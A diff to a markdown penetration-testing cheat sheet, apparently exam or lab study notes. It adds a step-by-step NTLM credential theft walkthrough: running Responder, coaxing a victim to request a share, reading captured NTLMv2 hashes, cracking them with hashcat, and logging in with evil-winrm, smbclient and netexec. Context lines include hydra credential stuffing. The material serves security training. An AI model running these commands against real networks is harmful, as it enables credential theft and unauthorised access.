@@ -549,6 +549,63 @@ hydra -C user_pass.txt ssh://10.129.42.197   # Credential stuffing user:pass lis
 
 ## System Hacking Attacks
 
+### NTLM Credential Theft Using Responder
+
+#### Step 1 — Check Interfaces
+```bash
+# Ensure target is on same interface as attack box
+# eth0 is your physical network interface. Use this when the target is on your local network (like Metasploitable2 in VirtualBox)
+# tun0 is a virtual VPN tunnel interface. Use this when the target is on HTB or a VPN network
+ip a show tun0    # HTB/exam environment
+ip a show eth0    # local network
+ip a              # check all interfaces
+ifconfig          # check all interfaces (try matching the first three octets)
+ip route get [TARGET IP]
+```
+
+#### Step 2 - Start Responder
+```bash
+sudo responder -I [INTERFACE]     # Basic start 
+sudo responder -I [INTERFACE] -v  # With verbose output
+```
+
+#### Step 3 - Initiate Request on Victim Machine
+- **Method 1:** Access a file share like `\\invalid-server\share` by typing "Run" in the Windows search bar
+- **Method 2:** Try to access a non-existent share using `net use \\nonexistenthost\share` in powershell
+- **Method 3:** Open File Explorer and enter `\\[KALI-IP]\random_folder`
+- **Method 4:** pinga a fake hostname
+
+#### Step 4 - Save the Hash
+```bash
+# Copy it to a file or view it where Responder automatically saves it...
+/usr/share/responder/logs/
+ls /usr/share/responder/logs/
+cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
+```
+
+#### Step 5 - Crack the Hash with Hashcat
+```bash
+# NTLMv2 = hashcat mode 5600
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or with rules
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+#### Step 6 - Use the Cracked Password
+```bash
+# SMB
+smbclient //[IP]/[SHARE] -U [USER]
+
+# Evil-WinRM
+evil-winrm -i [IP] -u [USER] -p [PASSWORD]
+
+# NetExec
+netexec smb [IP] -u [USER] -p [PASSWORD]
+```
+
+---
+
 ### Pass the Hash (PtH) 
 
 #### Mimikatz (Windows)
@@ -1217,3 +1274,8 @@ python3 phonesploitpro.py
 - Target device must have **USB Debugging enabled**
 - Target device must have **ADB over TCP enabled** on port 5555
 - Attacker and target on same network OR target IP reachable
+
+---
+
+## Other Helpful Links
+1. https://ceh-practical.cavementech.com/module-6.-system-hacking/1.-gain-access-to-the-system
